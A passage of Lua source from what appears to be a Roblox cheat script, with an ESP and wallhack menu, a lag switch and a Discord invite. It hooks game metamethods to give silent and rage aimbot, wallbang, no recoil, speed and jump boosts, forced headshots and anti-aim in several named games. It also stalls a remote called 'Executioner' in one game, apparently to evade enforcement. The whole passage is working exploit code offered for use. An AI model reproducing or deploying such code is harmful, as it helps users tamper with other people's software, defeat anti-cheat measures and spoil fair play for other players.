											Objects.LookAt.From = Vector2.new(HeadPosition1.X, HeadPosition1.Y)
											Objects.LookAt.To = Vector2.new(To.X, To.Y)
											Objects.LookAt.Color = LookColor
											Objects.LookAt.Transparency = Transparency
										else
											Objects.LookAt.Visible = false
										end
									else
										Objects.LookAt.Visible = false
									end

									if library.flags[Team .. " Direction Enabled"] then
										Objects.DirectionLine.Visible = true

										Position = Position + (Size / 2)
										local PositionOffset2d = V2Empty
										local Diff = (Pos.Position - Data.LastPosition)
										if Diff.Magnitude > 0.01 then
											PositionOffset2d = library.round(Vector2.new(WTSP(Camera, Pos.Position + (Diff.Unit * 4)).X, Position.Y) - Position)
										end

										Objects.DirectionLine.From = Position
										Objects.DirectionLine.To = Position + PositionOffset2d
										Objects.DirectionLine.Color = DirectionColor
										Objects.DirectionLine.Transparency = Transparency

										if Distance < 600 then
											Objects.DirectionDot.Visible = true
											Objects.DirectionDot.Position = Objects.DirectionLine.To - V233
											Objects.DirectionDot.Color = DirectionColor
											Objects.DirectionDot.Transparency = Transparency
										else
											Objects.DirectionDot.Visible = false
										end
									else
										Objects.DirectionLine.Visible = false
										Objects.DirectionDot.Visible = false
									end

									Data.LastPosition = Pos.Position
									continue
								end
								if library.flags[Team .. " OOV Arrows"] then
									Objects.OOVArrow.Visible = true
									Objects.OOVArrow.Color = Color or library.flags[Team .. Occluded .. "OOV Arrows Color"]

									local RelativePos = Camera.CFrame:Inverse() * Pos.Position
									local Middle = Camera.ViewportSize / 2
									local Degrees = math.deg(math.atan2(-RelativePos.Y, RelativePos.X)) * math.pi / 180
									local EndPos = Middle + (Vector2.new(math.cos(Degrees), math.sin(Degrees)) * library.flags[Team .. " Out Of View Scale"])

									Objects.OOVArrow.PointB = EndPos + (-(Middle - EndPos).Unit * 15)
									Objects.OOVArrow.PointA = EndPos
									Objects.OOVArrow.PointC = EndPos
									Objects.OOVArrow.Transparency = Transparency

									if not Objects.Visible then
										continue
									end
								end
							end
						end
					end
				end

				Objects.OOVArrow.Visible = false
				if Objects.Visible then
					Objects.Invis()
					Objects.InvisChams()
					Objects.InvisChamsOutline()
					Objects.InvisRadar()
				end
			end
		end)
	end}):AddList({flag = "Esp Enabled For", values = {"Enemies", "Teammates"}, multiselect = true}):AddBind({callback = function()
		library.options["Esp Enabled"]:SetState(not library.flags["Esp Enabled"])
	end})
	PlayerEspSection:AddSlider({text = "Max Distance", textpos = 2, flag = "Esp Max Distance", value = 9999999999999999999, min = 0, max = 9999999999999999999})
	PlayerEspSection:AddToggle({text = "Show Whitelisted Players", flag = "Esp Show Whitelisted"})

	--PlayerEspSection:AddDivider"Radar"
	--PlayerEspSection:AddToggle({text = "Enabled", flag = "Radar Enabled", callback = function(State)
	--	RadarWindow.Visible = State and library.flags["Esp Enabled"]
	--end})
	local VisualsWorld = VisualsColumn:AddSection"Lighting"
	VisualsWorld:AddToggle({text = "Clock Time"}):AddSlider({flag = "Clock Time Amount", min = 0, max = 24, float = 0.1, value = LightingSpoof.ClockTime})
	VisualsWorld:AddToggle({text = "Brightness"}):AddSlider({flag = "Brightness Amount", min = 0, max = 100, float = 0.1, value = LightingSpoof.Brightness})
	VisualsWorld:AddToggle({text = "Ambient", flag = "Ambient Lighting"}):AddColor({flag = "Outdoor Ambient", color = LightingSpoof.OutdoorAmbient}):AddColor({flag = "Indoor Ambient", color = LightingSpoof.Ambient})
	VisualsWorld:AddToggle({text = "Color Shift"}):AddColor({flag = "Color Shift Top", color = LightingSpoof.ColorShift_Top})

	local VisualsMiscSection = VisualsColumn:AddSection"Misc"

	VisualsMiscSection:AddToggle({text = "FOV Changer", callback = function(State)
		library.options["Dynamic Custom FOV"].main.Visible = State
	end}):AddSlider({flag = "FOV Amount", min = 0, max = 120})
	VisualsMiscSection:AddToggle({text = "Dynamic", flag = "Dynamic Custom FOV"})
	VisualsMiscSection:AddToggle({text = "Zoom", flag = "FOV Zoom Enabled"}):AddSlider({flag = "FOV Zoom Amount", min = 5, max = 50}):AddBind({flag = "FOV Zoom Key", mode = "hold"})

	VisualsMiscSection:AddDivider"Crosshair"
	VisualsMiscSection:AddToggle({text = "Enabled", flag = "Crosshair Enabled", callback = function(State)
		library.options["Crosshair T-Shape"].main.Visible = State
		library.options["Crosshair Size"].main.Visible = State
		library.options["Crosshair Gap"].main.Visible = State
		library.options["Crosshair Thickness"].main.Visible = State
		CrosshairTop.Visible = State and not library.flags["Crosshair T-Shape"]
		CrosshairLeft.Visible = State
		CrosshairRight.Visible = State
		CrosshairBottom.Visible = State
	end}):AddColor({callback = function(Color)
		CrosshairTop.Color = Color
		CrosshairLeft.Color = Color
		CrosshairRight.Color = Color
		CrosshairBottom.Color = Color
	end, trans = 1, calltrans = function(Transparency)
		CrosshairTop.Transparency = Transparency
		CrosshairLeft.Transparency = Transparency
		CrosshairRight.Transparency = Transparency
		CrosshairBottom.Transparency = Transparency
	end})
	VisualsMiscSection:AddToggle({text = "T-Shape", flag = "Crosshair T-Shape", callback = function(State)
		CrosshairTop.Visible = library.flags["Crosshair Enabled"] and not State
	end})
	VisualsMiscSection:AddSlider({text = "Size", textpos = 2, flag = "Crosshair Size", min = 1, max = 500, callback = function(Value)
		local Thickness = library.flags["Crosshair Thickness"]
		CrosshairTop.Size = Vector2.new(Thickness, -Value)
		CrosshairLeft.Size = Vector2.new(-Value, Thickness)
		CrosshairRight.Size = Vector2.new(Value, Thickness)
		CrosshairBottom.Size = Vector2.new(Thickness, Value)
	end})
	VisualsMiscSection:AddSlider({text = "Gap", textpos = 2, flag = "Crosshair Gap", min = 0, max = 20, float = 0.5})
	VisualsMiscSection:AddSlider({text = "Thickness", textpos = 2, flag = "Crosshair Thickness", min = 1, max = 20, float = 0.5, callback = function(Value)
		local Size = library.flags["Crosshair Size"]
		CrosshairTop.Size = Vector2.new(Value, -Size)
		CrosshairLeft.Size = Vector2.new(-Size, Value)
		CrosshairRight.Size = Vector2.new(Size, Value)
		CrosshairBottom.Size = Vector2.new(Value, Size)
	end})

	local PlayerEspEnemySection = VisualsColumn1:AddSection"Enemies"
	PlayerEspEnemySection:AddToggle({text = "Visible Only", flag = "Enemy Visible Only"})

	PlayerEspEnemySection:AddToggle({text = "Box", flag = "Enemy Box Enabled"}):AddColor({flag = "Enemy Occluded Box Color", color = Color3.fromRGB(245, 120, 65)}):AddColor({flag = "Enemy Box Color", color = Color3.fromRGB(240, 40, 50)})

	PlayerEspEnemySection:AddToggle({text = "Info", flag = "Enemy Info"}):AddColor({flag = "Enemy Occluded Info Color", color = Color3.fromRGB(255, 140, 30)}):AddColor({flag = "Enemy Info Color", color = Color3.fromRGB(240, 30, 40)})

	PlayerEspEnemySection:AddToggle({text = "Health", flag = "Enemy Health Enabled"})

	PlayerEspEnemySection:AddToggle({text = "Out Of View", flag = "Enemy OOV Arrows", callback = function(State)
		library.options["Enemy Out Of View Scale"].main.Visible = State
	end}):AddColor({flag = "Enemy Occluded OOV Arrows Color", color = Color3.fromRGB(255, 140, 30)}):AddColor({flag = "Enemy OOV Arrows Color", color = Color3.fromRGB(240, 30, 40)})
	PlayerEspEnemySection:AddSlider({text = "Scale", textpos = 2, flag = "Enemy Out Of View Scale", min = 100, max = 500})

	PlayerEspEnemySection:AddToggle({text = "Look Direction", flag = "Enemy Look Enabled"}):AddColor({flag = "Enemy Occluded Look Color", color = Color3.fromRGB(240, 120, 80)}):AddColor({flag = "Enemy Look Color", color = Color3.fromRGB(240, 60, 20)})

	--PlayerEspEnemySection:AddToggle({text = "Velocity", flag = "Enemy Direction Enabled"}):AddColor({flag = "Enemy Occluded Direction Color", color = Color3.fromRGB(240, 120, 80)}):AddColor({flag = "Enemy Direction Color", color = Color3.fromRGB(240, 60, 20)})

	PlayerEspEnemySection:AddToggle({text = "Chams", flag = "Enemy Chams Enabled"}):AddSlider({text = "Transparency", flag = "Enemy Chams Transparency", min = 0, max = 1, float = 0.1}):AddColor({flag = "Enemy Occluded Chams Color", color = Color3.fromRGB(245, 120, 65)}):AddColor({flag = "Enemy Chams Color", color = Color3.fromRGB(240, 40, 50)})
	PlayerEspEnemySection:AddToggle({text = "Outline", flag = "Enemy Chams Outline"}):AddColor({flag = "Enemy Occluded Chams Outline Color", color = Color3.fromRGB(245, 120, 65)}):AddColor({flag = "Enemy Chams Outline Color", color = Color3.fromRGB(240, 40, 50)})

	local PlayerEspTeamSection = VisualsColumn1:AddSection"Teammates"
	PlayerEspTeamSection:AddToggle({text = "Visible Only", flag = "Team Visible Only"})

	PlayerEspTeamSection:AddToggle({text = "Box", flag = "Team Box Enabled"}):AddColor({flag = "Team Occluded Box Color", color = Color3.fromRGB(20, 50, 255)}):AddColor({flag = "Team Box Color", color = Color3.fromRGB(40, 255, 180)})

	PlayerEspTeamSection:AddToggle({text = "Info", flag = "Team Info"}):AddColor({flag = "Team Occluded Info Color", color = Color3.fromRGB(20, 120, 255)}):AddColor({flag = "Team Info Color", color = Color3.fromRGB(40, 240, 130)})

	PlayerEspTeamSection:AddToggle({text = "Health", flag = "Team Health Enabled"})

	PlayerEspTeamSection:AddToggle({text = "Out Of View", flag = "Team OOV Arrows", callback = function(State)
		library.options["Team Out Of View Scale"].main.Visible = State
	end}):AddColor({flag = "Team Occluded OOV Arrows Color", color = Color3.fromRGB(20, 120, 255)}):AddColor({flag = "Team OOV Arrows Color", color = Color3.fromRGB(40, 240, 130)})
	PlayerEspTeamSection:AddSlider({text = "Scale", textpos = 2, flag = "Team Out Of View Scale", min = 100, max = 500})

	PlayerEspTeamSection:AddToggle({text = "Look Direction", flag = "Team Look Enabled"}):AddColor({flag = "Team Occluded Look Color", color = Color3.fromRGB(40, 80, 230)}):AddColor({flag = "Team Look Color", color = Color3.fromRGB(40, 250, 100)})

	--PlayerEspTeamSection:AddToggle({text = "Velocity", flag = "Team Direction Enabled"}):AddColor({flag = "Team Occluded Direction Color", color = Color3.fromRGB(240, 120, 80)}):AddColor({flag = "Team Direction Color", color = Color3.fromRGB(240, 60, 20)})

	PlayerEspTeamSection:AddToggle({text = "Chams", flag = "Team Chams Enabled"}):AddSlider({text = "Transparency", flag = "Team Chams Transparency", min = 0, max = 1, float = 0.1}):AddColor({flag = "Team Occluded Chams Color", color = Color3.fromRGB(20, 50, 255)}):AddColor({flag = "Team Chams Color", color = Color3.fromRGB(40, 255, 180)})
	PlayerEspTeamSection:AddToggle({text = "Outline", flag = "Team Chams Outline"}):AddColor({flag = "Team Occluded Chams Outline Color", color = Color3.fromRGB(80, 100, 255)}):AddColor({flag = "Team Chams Outline Color", color = Color3.fromRGB(80, 255, 200)})

	--Misc stuff
	local MiscTab = library:AddTab"Misc"
	local MiscColumn = MiscTab:AddColumn()
	local MiscColumn1 = MiscTab:AddColumn()
	local MiscMain = MiscColumn:AddSection"Main"
	MiscMain:AddButton({text = "Copy Discord invite", callback = function() setclipboard("https://discord.gg/pBRqP4xT9P") end})
	if setfpscap then
		MiscMain:AddSlider({text = "Set FPS Cap", min = 5, max = 360, callback = function(Value) setfpscap(Value) end})
	end
	local Lagging
	MiscMain:AddToggle({text = "Lag Switch", callback = function()
		Lagging = false
		Settings.Network.IncomingReplicationLag = 0
	end}):AddSlider({text = "Timeout", flag = "Lag Switch Timeout", min = 1, max = 10, float = 0.1, suffix = "s"}):AddBind({callback = function()
		if library.flags["Lag Switch"] then
			Lagging = not Lagging
			Settings.Network.IncomingReplicationLag = Lagging and 1000 or 0
			if Lagging then
				local LagStart = tick()
				while Lagging do
					wait(1)
					if tick() - LagStart >= library.flags["Lag Switch Timeout"] then
						library.options["Lag Switch"].callback()
					end
				end
			end
		end
	end})

	local PlayerList = MiscColumn1:AddSection"Player List"
	PlayerList:AddList({flag = "Player List", textpos = 2, skipflag = true, max = 10, values = (function() local t = {} for _, Player in next, PlayerServ:GetPlayers() do if Player ~= Client then table.insert(t, Player.Name) end end return t end)(), callback = function(Value)
		local Player = Players[FFC(PlayerServ, Value)]
		library.options["Set Player Priority"]:SetState(Player and Player.Priority, true)
		library.options["Set Player Whitelist"]:SetState(Player and Player.Whitelist, true)
	end})
	PlayerList:AddToggle({text = "Priority", skipflag = true, style = 2, flag = "Set Player Priority", callback = function(State)
		local Player = Players[FFC(PlayerServ, library.flags["Player List"])]
		if Player then
			Player.Priority = State
			if State then
				library.options["Set Player Whitelist"]:SetState(false)
			end
		end
	end}):AddColor({flag = "Player Priority Color", color = Color3.fromRGB(255, 255, 0)})
	PlayerList:AddToggle({text = "Whitelist", skipflag = true, style = 2, flag = "Set Player Whitelist", callback = function(State)
		local Player = Players[FFC(PlayerServ, library.flags["Player List"])]
		if Player then
			Player.Whitelist = State
			if State then
				library.options["Set Player Priority"]:SetState(false)
			end
		end
	end}):AddColor({flag = "Player Whitelist Color", color = Color3.fromRGB(0, 255, 255)})

	--[[
	local XPos, YPos, ZPos = 0, 0, 0
	local FreecamPos = Camera.CFrame.Position
	local CameraCF = Camera.CFrame
	local CameraSubject, CameraType = Camera.CameraSubject, Camera.CameraType

	local MiscFreecam = MiscColumn1:AddSection"Freecam"
	MiscFreecam:AddToggle({
	text = "Enabled", flag = "Freecam Enabled", tip = "Note: this will stop your character from moving"}):AddSlider({
	text = "Speed", flag = "Freecam Speed", min = 1, max = 20}):AddBind({
	flag = "Freecam Key", mode = "hold", callback = function(Ended)
		if library.flags["Freecam Enabled"] then
			if Ended then
				Camera.CFrame = CFrame.new(CameraCF.Position, CameraCF.LookVector)
				Camera.CameraType = CameraType
				Camera.CameraSubject = CameraSubject
			else
				--Camera.CameraType = "Scriptable"
				--Camera.CameraSubject = nil
				FreecamPos = CameraCF.Position + (Vector3.new(XPos, YPos, ZPos) * library.flags["Freecam Speed"])
				Camera.CFrame = CFrame.new(FreecamPos, CameraCF.LookVector)
			end
		end
	end})

	library:AddConnection(inputService.InputBegan, function(Input)
		if Input.KeyCode.Name == "W" then
			ZPos = ZPos + 1
		elseif Input.KeyCode.Name == "S" then
			ZPos = ZPos - 1
		elseif Input.KeyCode.Name == "D" then
			XPos = XPos + 1
		elseif Input.KeyCode.Name == "A" then
			XPos = XPos - 1
		elseif Input.KeyCode.Name == "Space" then
			YPos = YPos + 1
		elseif Input.KeyCode.Name == "LeftShift" then
			YPos = YPos - 1
		end
	end)
	library:AddConnection(inputService.InputBegan, function(Input)
		if Input.KeyCode.Name == "W" then
			ZPos = ZPos - 1
		elseif Input.KeyCode.Name == "S" then
			ZPos = ZPos + 1
		elseif Input.KeyCode.Name == "D" then
			XPos = XPos - 1
		elseif Input.KeyCode.Name == "A" then
			XPos = XPos + 1
		elseif Input.KeyCode.Name == "Space" then
			YPos = YPos - 1
		elseif Input.KeyCode.Name == "LeftShift" then
			YPos = YPos + 1
		end
	end)
	--]]


	--Hooks
	local OldCallingScript
	OldCallingScript = hookfunction(getcallingscript, function()
		return OldCallingScript() or {}
	end)

	local Old_new
	Old_new = hookmetamethod(game, "__newindex", function(t, i, v)
		if checkcaller() or not library then return Old_new(t, i, v) end

		if t == Camera then
			if i == "CFrame" then
				--CameraCF = v
				if library.flags["Freecam Enabled"] and library.flags["Freecam Key"] then
					--v = CFrame.new(FreecamPos, CameraCF.LookVector)
				else
					if library.flags["Aimbot Mode"] == "Rage" then
						if library.Aimbot.Position3d then
							v = CFrame.new(v.p, library.Aimbot.Position3d)
						end
					end
				end
			elseif i == "CameraSubject" then
				--CameraSubject = v
				--print("setting subject")
				--return not (library.flags["Freecam Enabled"] and library.flags["Freecam Key"]) and CameraSubject or nil
			elseif i == "CameraType" then
				--CameraType = v
				--print("setting type")
				--return (library.flags["Freecam Enabled"] and library.flags["Freecam Key"]) and "Scriptable" or CameraType
			end
		end

		if GameTitle == "Bad Business" then
			if i == "Velocity" then
				if library.flags["Jump Multiplier"] ~= 1 then
					if OldCallingScript().Name == "ControlScript" then
						v = Vector3.new(v.X, v.Y * library.flags[GameTitle .. " Jump Multiplier"], v.Z)
					end
				end
				if library.flags["Speed Multiplier"] ~= 1 then
					if t.Name == "Root" then
						local X,Y,Z = v.X * library.flags[GameTitle .. " Speed Multiplier"], v.Y, v.Z * library.flags[GameTitle .. " Speed Multiplier"]
						v = Vector3.new(X, Y, Z)
					end
				end
			end
		elseif GameTitle == "Ace Of Spadez" then
			if library.flags[GameTitle .. " No Recoil"] then
				if t == Camera and i == "CFrame" then
					if OldCallingScript().Name == "WeaponSystem" then
						return
					end
				end
			end
		elseif GameTitle == "Counter Blox" then
			if i == "WalkSpeed" then
				if library.flags[GameTitle .. " Bhop"] and not inputService:GetFocusedTextBox() then
					if inputService:IsKeyDown(Enum.KeyCode.Space) then
						v = library.flags[GameTitle .. " Bhop Speed"]
					end
				end
			end
		end

		if t == Lighting then
			if i == "ClockTime" then
				LightingSpoof[i] = v
				v = library.flags["ClockTime"] and library.flags["Clock Time Amount"] or v
			elseif i == "Brightness" then
				LightingSpoof[i] = v
				v = library.flags["Brightness"] and library.flags["Brightness Amount"] or v
			elseif i == "Ambient" or i == "OutdoorAmbient" then
				LightingSpoof[i] = v
				v = library.flags["Ambient Lighting"] and (i == "Ambient" and library.flags["Indoor Ambient"] or library.flags["Outdoor Ambient"]) or v
			elseif i == "ColorShift_Top" then
				LightingSpoof[i] = v
				v = library.flags["Color Shift"] and library.flags["Color Shift Top"] or v
			end
		elseif t == Camera then
			if i == "FieldOfView" then
				CameraSpoof[i] = v
				v = (library.flags["FOV Zoom Enabled"] and library.flags["FOV Zoom Key"] and (50 - library.flags["FOV Zoom Amount"])) or library.flags["FOV Changer"] and (library.flags["Dynamic Custom FOV"] and (CameraSpoof.FieldOfView + library.flags["FOV Amount"]) or library.flags["FOV Amount"]) or v
			end
		end

		return Old_new(t, i, v)
	end)

	local Old_index
	Old_index = hookmetamethod(game, "__index", function(t, i)
		if checkcaller() or not library then return Old_index(t, i) end

		if t == Camera then
			if i == "CFrame" then
				if library.flags["Freecam Enabled"] and library.flags["Freecam Key"] then
					--return CameraCF
				end
				if library.Aimbot.Position3d then
					if library.flags["Aimbot Mode"] == "Silent" then
						if GameTitle == "Bad Business" then
							if OldCallingScript().Name == "ItemControlScript" then
								local OldCF = Old_index(t, i)
								return CFrame.new(OldCF.Position, library.Aimbot.Position3d)
							end
						end
					elseif library.flags["Aimbot Mode"] == "Rage" then
						return CFrame.new(Old_index(t, i).Position, library.Aimbot.Position3d)
					end
				end
			elseif i == "CameraSubject" then
				--return CameraSubject
			elseif i == "CameraType" then
				--return CameraType
			end
		end

		if t == Lighting then
			if i == "ClockTime" or i == "Brightness" or i == "Ambient" or i == "OutdoorAmbient" or i == "ColorShift_Top" then
				return LightingSpoof[i]
			end
		elseif t == Camera then
			if i == "FieldOfView" then
				return CameraSpoof[i]
			end
		end

		return Old_index(t, i)
	end)

	local Old_call
	Old_call= hookmetamethod(game, "__namecall", function(self, ...)
		if checkcaller() or not library then return Old_call(self, ...) end

		local Args = {...}
		local Method = getnamecallmethod()

		if Method == "FindPartOnRayWithWhitelist" then
			if GameTitle == "Bad Business" then
				if Args[2][1] and Args[2][2] and Args[2][1].Name == "Geometry" and Args[2][2].Name == "Terrain" then
					if library.flags[GameTitle .. " Wallbang"] then
						Args[2][1] = nil
						Args[2][2] = nil
					end
				end
			elseif GameTitle == "Ace Of Spadez" then
				if OldCallingScript().Name == "WeaponSystem" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
					if library.flags[GameTitle .. " Wallbang"] then
						Args[2][1] = nil
					else
						Args[2][1] = workspace.Game.Map
					end
				end
			elseif GameTitle == "Zombie Attack" then
				if OldCallingScript().Name == "GunController" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * 1000)
					end
				end
			end
		elseif Method == "FindPartOnRayWithIgnoreList" then
			if GameTitle == "Arsenal" then
				if library.flags[GameTitle .. " Wallbang"] and Args[2][1].Name == "Clips" then
					local n = #Args[2]
					Args[2][n + 1] = workspace.Map
				end
				if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
					Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
				end
			elseif GameTitle == "Unit: Classified" then
				if #Args[2] > 15 then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
					if library.flags[GameTitle .. " Wallbang"]  then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
						Args[2][n + 2] = workspace.Terrain
					end
				end
			elseif GameTitle == "MURDER" then
				if tostring(Args[2][3]) == "Debris" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
					if library.flags[GameTitle .. " Wallbang"]  then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
					end
				end
			elseif GameTitle == "KAT" then
				if OldCallingScript().Name == "KnifeClient" or OldCallingScript().Name == "RevolverClient" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
				end
			elseif GameTitle == "MMC Zombies Project" then
				if OldCallingScript().Name == "client_main" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
					end
					if library.flags[GameTitle .. " Wallbang"] then
						setnamecallmethod("FindPartOnRayWithWhitelist")
						Args[2] = {
							workspace.map.enemies,
						}
					end
				end
			elseif GameTitle == "Project Lazarus" then
				if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
					Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * library.flags["Aimbot Max Distance"])
				end
				if library.flags[GameTitle .. " Wallbang"] then
					local n = #Args[2]
					Args[2][n + 1] = workspace.Map
				end
			elseif GameTitle == "Zombie Rush" then
				if OldCallingScript().Name == "GunController" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * 1000)
					end
					if library.flags[GameTitle .. " Wallbang"] then
						local n = #Args[2]
						Args[2][n + 1] = workspace["Map Storage"]
					end
				end
			elseif GameTitle == "Resurrection" then
				if OldCallingScript().Name == "Client" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).unit * 1000)
					end
					if library.flags[GameTitle .. " Wallbang"] then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
						Args[2][n + 2] = workspace.Terrain
					end
				end
			elseif GameTitle == "Blackhawk Rescue Mission" then
				if OldCallingScript().Name == "InputHandler" then
					if library.flags[GameTitle .. " Wallbang"] then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Terrain
						Args[2][n + 2] = workspace.Custom["0"]
					end
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
					end
				end
			elseif GameTitle == "Shoot Out" then
				if OldCallingScript().Name == "Replication" then
					if library.flags[GameTitle .. " Wallbang"] then
						local n = #Args[2]
						Args[2][n + 1] = workspace.Map
					end
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
					end
				end
			elseif GameTitle == "Weaponry" then
				if OldCallingScript().Name == "Client_Major_Framework" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
					end
				end
			elseif GameTitle == "Counter Blox" then
				if #Args[2] > 10 then
					if library.flags[GameTitle .. " No Spread"] then
						local Char = Players[Client].Character
						if Char then
							Args[1] = Ray.new(Vector3.new(Char.HumanoidRootPart.Position.X, Char.Head.Position.Y, Char.HumanoidRootPart.Position.Z), Camera.CFrame.LookVector * 1000)
						end
					end
					if library.flags[GameTitle .. " Wallbang"] then
						Args[2][#Args[2] + 1] = workspace.Map
					end
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						local Char = Players[Client].Character
						if Char then
							local Origin = Vector3.new(Char.HumanoidRootPart.Position.X, Char.Head.Position.Y, Char.HumanoidRootPart.Position.Z)
							Args[1] = Ray.new(Origin, (library.Aimbot.Position3d - Origin).Unit * 1000)
						end
					end
				end
			elseif GameTitle == "Death Zone" then
				if OldCallingScript().Name == "GunScript" then
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						Args[1] = Ray.new(Camera.CFrame.p, (library.Aimbot.Position3d - Camera.CFrame.p).Unit * library.flags["Aimbot Max Distance"])
					end
				end
			end

		elseif Method == "FireServer" then
			if GameTitle == "Arsenal" then
				if self.Name == "CreateProjectile" or self.Name == "ReplicateProjectile" then
					local t = self.Name == "ReplicateProjectile" and Args[1] or Args
					if library.flags["Aimbot Mode"] == "Silent" and library.Aimbot.Position3d then
						t[3] = library.Aimbot.Position3d
						t[4] = CFrame.new(library.Aimbot.Position3d) + Vector3.new(0, 0.5, 0)
						t[10] = library.Aimbot.Position3d + Vector3.new(0, 0.5, 0)
					end
				end
			elseif GameTitle == "Zombie Attack" then
				if library.flags[GameTitle .. " Always Headshot"] and FFCoC(Args["Hit"].Parent, "Humanoid") then
					Args["Hit"] = Args["Hit"].Parent.Head
				end
			elseif GameTitle == "Counter Blox" then
				if self.Name == "ControlTurn" and library.flags[GameTitle .. " Anti-Aim"] then
					Args[1] = library.flags[GameTitle .. " Pitch"]
					--elseif string.len(self.Name) > 35 then
					--	if library.flags[GameTitle .. " Unlock Skins"] and not eF then
					--		eF = true
					--		for V, v in next, e4 do
					--			local eQ
					--			for eC, eD in next, Args[1] do
					--				if v[1] == eD[1] then
					--					eQ = true
					--				end
					--			end
					--			if not eQ then
					--				local n = #Args[1]
					--				Args[1][n + 1] = v
					--			end
					--		end
					--	end
					--	return
				elseif self.Name == "HitPart" and (library.flags[GameTitle .. " Hitsound"] or library.flags[GameTitle .. " Bullet Tracers"]) then
					spawn(function()
						if library.flags[GameTitle .. " Hitsound"] then
							if Args[1] and FFCoC(Args[1].Parent, "Humanoid") then
								local Target = FFC(game.Players, Args[1].Parent.Name)
								if Target and Target.Team ~= Client.Team then
									local Sounds = library.options[GameTitle .. " Hitsounds"].values
									local Sound = library.flags[GameTitle .. " Hitsounds"]
									library:Create("Sound", {
										PlayOnRemove = true,
										Volume = library.flags[GameTitle .. " Hitsound Volume"],
										SoundId = "rbxassetid://" .. (typeof(Sounds[Sound]) == "function" and Sounds[Sound]() or Sounds[Sound]),
										Parent = workspace
									}):Destroy()
								end
							end
						end
						if library.flags[GameTitle .. " Bullet Tracers"] then
							local Char = Client.Character
							local HumPart = FFC(Char, "HumanoidRootPart")
							local Flash = FFC(Camera, "Flash", true)
							if HumPart and Flash then
								local d1 = library:Create("Part", {Anchored = true, Parent = workspace})
								local eV = library:Create("Attachment", {WorldPosition = Flash.Position, Parent = d1})
								local eW = library:Create("Attachment", {WorldPosition = Args[2], Parent = d1})
								library:Create("Beam", {
									Color = ColorSequence.new(library.flags[GameTitle .. " Bullet Tracer Color"]),
									LightEmission = 1,
									LightInfluence = 0,
									Texture = "rbxassetid://967852047",
									Transparency = NumberSequence.new(0.6),
									TextureLength = 0.1,
									TextureSpeed = 1,
									Attachment0 = eV,
									Attachment1 = eW,
									Segments = 1,
									FaceCamera = true,
									Width0 = 0.15,
									Width1 = 0.15,
									Parent = d1
								})
								library:Create("Beam", {
									Color = ColorSequence.new(library.flags[GameTitle .. " Bullet Tracer Color"]),
									LightEmission = 1,
									LightInfluence = 0,
									Texture = "rbxassetid://967852047",
									Transparency = NumberSequence.new(0.6),
									TextureLength = 0.1,
									TextureSpeed = 1,
									Attachment0 = eV,
									Attachment1 = eW,
									Segments = 1,
									FaceCamera = true,
									Width0 = 0.2,
									Width1 = 0.2,
									Parent = d1
								})
								game:GetService"Debris":AddItem(d1, library.flags[GameTitle .. " Lifetime"])
							end
						end
					end)
				end
			elseif GameTitle == "Death Zone" then
				if self.Name == "Executioner" then
					return wait(9e9)
				end
			end

		elseif Method == "InvokeServer" then

		elseif Method == "SetPrimaryPartCFrame" then
			if GameTitle == "Counter Blox" then
				if self.Name == "Arms" then
					if library.flags[GameTitle .. " Viewmodel Changer"] then
						if library.flags[GameTitle .. " Flip Z"] then
							Args[1] = Args[1] * CFrame.new(1, 1, 1, 0, 0, 1, 0)
						end
						if library.flags[GameTitle .. " Flip Y"] then
							Args[1] = Args[1] * CFrame.new(1, 1, 1, 0.5, 0, 0, 0)
						end
						local X = library.flags[GameTitle .. " X Offset"] * 120 / 500
						local Y = library.flags[GameTitle .. " Y Offset"] * 120 / 500
						local dl = library.flags[GameTitle .. " Z Offset"] * 120 / 500
